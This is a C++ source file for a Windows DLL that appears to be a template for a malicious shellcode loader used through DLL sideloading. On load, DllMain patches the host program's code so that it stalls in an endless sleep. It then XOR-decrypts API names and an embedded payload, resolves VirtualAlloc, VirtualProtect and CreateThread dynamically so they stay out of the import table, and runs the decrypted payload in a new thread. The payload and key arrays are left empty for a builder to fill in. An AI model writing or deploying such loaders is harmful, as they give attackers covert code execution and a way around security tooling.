#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <string>


typedef LPVOID (WINAPI* fnVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL (WINAPI* fnVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef HANDLE (WINAPI* fnCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef VOID (WINAPI* fnSleep)(DWORD dwMilliseconds);


void DoNothing() {
    while (true) Sleep(10 * 1000);
}

void InstallHook(PVOID address, PVOID jump) {
    BYTE Jump[12] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
    
    DWORD old;
    VirtualProtect(address, sizeof(Jump), PAGE_EXECUTE_READWRITE, &old);

    memcpy(address, Jump, 12);
    memcpy(((PBYTE)address + 2), &jump, 8);

    VirtualProtect(address, sizeof(Jump), old, &old);
}

BOOL HookTheStack() {
    // Get primary module info

    PBYTE baseAddress = NULL;
    DWORD baseSize = 0;

    WCHAR fileName[MAX_PATH];
    GetModuleFileNameW(NULL, fileName, MAX_PATH);
    std::wstring pathString = std::wstring(fileName);

    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId());

    MODULEENTRY32W pEntry;
    pEntry.dwSize = sizeof(pEntry);
    BOOL hRes = Module32FirstW(hSnapShot, &pEntry);
    while (hRes)
    {
        if (pathString.find(pEntry.szModule) != std::wstring::npos) {
            baseAddress = pEntry.modBaseAddr;
            baseSize = pEntry.modBaseSize;
            break;
        }
        hRes = Module32NextW(hSnapShot, &pEntry);
    }
    CloseHandle(hSnapShot);

    if (!baseAddress || !baseSize)
        return FALSE;

    // Hunt the stack

    PBYTE ldrLoadDll = (PBYTE)GetProcAddress(GetModuleHandleW(L"ntdll"), "LdrLoadDll");
    PBYTE * stack = (PBYTE *)__builtin_return_address(0);
    BOOL foundLoadDll = FALSE;

    ULONG_PTR lowLimit = 0, highLimit = 0;
    // Placeholder for GetCurrentThreadStackLimits, which is not available in MinGW
    // You may need to implement this differently or use a fixed range

    for (; (ULONG_PTR)stack < highLimit; stack++) {
        if (*stack < (PBYTE)0x1000)
            continue;

        if (*stack > ldrLoadDll && *stack < ldrLoadDll + 0x1000) {
            // LdrLoadDll is in the stack, let's start looking for our module
            foundLoadDll = TRUE;
        }

        if (foundLoadDll && *stack > baseAddress && *stack < (baseAddress + baseSize)) {
            MEMORY_BASIC_INFORMATION mInfo = { 0 };
            VirtualQuery(*stack, &mInfo, sizeof(mInfo));

            if (!(mInfo.Protect & PAGE_EXECUTE_READ))
                continue;

            // Primary module is in the stack, let's hook there
            InstallHook(*stack, (PVOID)DoNothing);

            return TRUE;
        }
    }

    // No references found, let's just hook the entry point

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(baseAddress + dosHeader->e_lfanew);
    PBYTE entryPoint = baseAddress + ntHeader->OptionalHeader.AddressOfEntryPoint;

    InstallHook(entryPoint, (PVOID)&DoNothing);
    
    return TRUE;
}

void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j;

    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}

LPCSTR ConvertUnsignedCharArrayToLPCSTR(const unsigned char* src, size_t src_len)
{
    // Allocate memory for the new string (including space for null terminator)
    char* bstr = (char*)malloc(src_len + 1);
    
    // Copy the data
    memcpy(bstr, src, src_len);
    
    // Null-terminate the string
    bstr[src_len] = '\0';
    
    return bstr;
}

extern "C" {
    BOOL execute() {

        // Encrypted strings
        unsigned char buf[] = { };
        unsigned char virtual_alloc[] = { };
        unsigned char virtual_protect[] = { };
        unsigned char kernel32[] = { };
        unsigned char create_thread[] = { };
        unsigned char sleep_var[] = { };
        char pl_key[] = "";
        char va_key[] = "";
        char vp_key[] = "";
        char k_key[] = "";
        char ct_key[] = "";
        char s_key[] = "";

        // Decrypt strings
        XOR((char*)virtual_alloc, sizeof(virtual_alloc), va_key, sizeof(va_key));
        XOR((char*)virtual_protect, sizeof(virtual_protect), vp_key, sizeof(vp_key));
        XOR((char*)kernel32, sizeof(kernel32), k_key, sizeof(k_key));
        XOR((char*)create_thread, sizeof(create_thread), ct_key, sizeof(ct_key));
        XOR((char*)sleep_var, sizeof(sleep_var), s_key, sizeof(s_key));

        // Convert strings to LPCSTR
        LPCSTR k32_wide = ConvertUnsignedCharArrayToLPCSTR(kernel32, sizeof(kernel32) / sizeof(kernel32[0]));
        LPCSTR va_wide = ConvertUnsignedCharArrayToLPCSTR(virtual_alloc, sizeof(virtual_alloc) / sizeof(virtual_alloc[0]));
        LPCSTR vp_wide = ConvertUnsignedCharArrayToLPCSTR(virtual_protect, sizeof(virtual_protect) / sizeof(virtual_protect[0]));
        LPCSTR ct_wide = ConvertUnsignedCharArrayToLPCSTR(create_thread, sizeof(create_thread) / sizeof(create_thread[0]));
        LPCSTR s_wide = ConvertUnsignedCharArrayToLPCSTR(sleep_var, sizeof(sleep_var) / sizeof(sleep_var[0]));

        // Dynamic linking to prevent some Win32 APIs from being inside IAT
        fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)GetProcAddress(GetModuleHandleA(k32_wide), va_wide);
        fnVirtualProtect pVirtualProtect = (fnVirtualProtect)GetProcAddress(GetModuleHandleA(k32_wide), vp_wide);
        fnCreateThread pCreateThread = (fnCreateThread)GetProcAddress(GetModuleHandleA(k32_wide), ct_wide);
        fnSleep pSleep = (fnSleep)GetProcAddress(GetModuleHandleA(k32_wide), s_wide);

        // Allocate memory
        PVOID payloadAddress = pVirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (payloadAddress == NULL) {
            return 1;
        }

        // Decrypt payload
        XOR((char*)buf, sizeof(buf), pl_key, sizeof(pl_key));

        // Copy payload
        memcpy(payloadAddress, buf, sizeof(buf));

        // Change protection
        DWORD oldProt = 0;
        BOOL success = pVirtualProtect(payloadAddress, sizeof(buf), PAGE_EXECUTE_READ, &oldProt);

        if (!success) {
            return 1;
        }

        // Execute payload
        HANDLE hThread = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE)payloadAddress, 0, 0, 0);
        if (hThread == NULL) {
            return 1;
        }

        pSleep(1000);

        return 0;
    }
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    if (ul_reason_for_call != DLL_PROCESS_ATTACH)
        return TRUE;

    if (!HookTheStack())
        return TRUE;

    execute();
    return TRUE;
}
